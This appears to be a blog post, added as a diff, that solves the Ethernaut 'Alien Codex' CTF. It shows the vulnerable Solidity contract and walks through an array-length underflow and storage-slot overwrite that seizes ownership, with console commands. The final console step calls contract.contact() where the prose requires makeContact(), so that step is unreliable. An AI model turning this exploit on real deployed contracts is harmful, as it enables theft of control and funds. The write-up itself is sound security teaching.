@@ -1,0 +1,111 @@
+---
+title: Ethernaut - Alien Codex - Solution
+date: '2024-06-19'
+tags: ['security', 'solidity', 'ctfs']
+draft: false
+summary: Solution to the Ethernaut - Alien Codex CTF
+---
+
+# Ethernaut - Alien Codex - Solution
+
+## Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.5.0;
+
+import "../helpers/Ownable-05.sol";
+
+contract AlienCodex is Ownable {
+    bool public contact;
+    bytes32[] public codex;
+
+    modifier contacted() {
+        assert(contact);
+        _;
+    }
+
+    function makeContact() public {
+        contact = true;
+    }
+
+    function record(bytes32 _content) public contacted {
+        codex.push(_content);
+    }
+
+    function retract() public contacted {
+        codex.length--;
+    }
+
+    function revise(uint256 i, bytes32 _content) public contacted {
+        codex[i] = _content;
+    }
+}
+```
+
+## Solution
+
+The goal of this challenge is to become the owner of the contract.
+
+Before we discuss the solution, I highly recommend reading the section on the [layout of dynamic arrays in storage](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html#mappings-and-dynamic-arrays) in the official Solidity docs.
+
+Based on the docs, our level instance has the following storage layout:
+
+| Slot | Data |
+|------|------|
+| $$0$$ | `bool public contact` and `address private _owner` |
+| $$1$$ | `codex.length` |
+|...| ... |
+| $$keccak256(1)$$ | `codex[0]` |
+| $$keccak256(1) + 1$$ | `codex[1]` |
+|...| ... |
+| $$2^{256} - 1$$ | `codex[2 ** 256 - 1 - uint256(keccak256(abi.encode(1)))]` |
+| $$0$$ | `codex[2 ** 256 - 1 - uint256(keccak256(abi.encode(1))) + 1]` |
+|...| ... |
+
+Notice that both `contact` as well as `Ownable`'s `_owner` will be packed into slot 0.
+We can verify this by executing
+
+```bash
+cast storage <your level instance address> 0 --rpc-url $SEP_RPC_URL
+```
+
+before and after calling `makeContact()`.
+
+Furthermore, notice that the `revise()` function allows us to override what's stored in slot 0 by writing to the `2 ** 256 - 1 - uint256(keccak256(abi.encode(1))) + 1`th entry of the `codex` array.
+However, in order to set a value at this index, we must ensure our `codex` array is large enough for the index `2 ** 256 - 1 - uint256(keccak256(abi.encode(1))) + 1` to exist.
+To achieve that, we can use `retract()` to subtract 1 from `codex.length` to underflow the array's length from zero to $$2^{256}-1$$.
+
+As conclusion, we can become the owner of the level instance via the following steps:
+
+1. Call `makeContact()` so that we can pass the `contacted()` modifier.
+2. Call `retract()` to increase `codex.length` to $$2^{256}-1$$.
+3. Call `revise()` to override slot 0 in a way that makes our player EOA the owner.
+
+Based on the insights mentioned above, we can compute the parameters needed for step 3. via Chisel:
+
+#### `i`
+```bash
+➜ uint256 i = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;
+➜ i
+Type: uint256
+├ Hex: 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
+├ Hex (full word): 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
+└ Decimal: 35707666377435648211887908874984608119992236509074197713628505308453184860938
+```
+
+#### `_content`
+
+```bash
+➜ bytes32(uint256(uint160(<your player address>)))
+```
+
+To summarize, we can solve this level in the Ethernaut console via:
+
+```javascript
+await contract.contact()
+
+await contract.retract()
+
+await contract.revise("35707666377435648211887908874984608119992236509074197713628505308453184860938", "<your player address cast to bytes32>")
+```
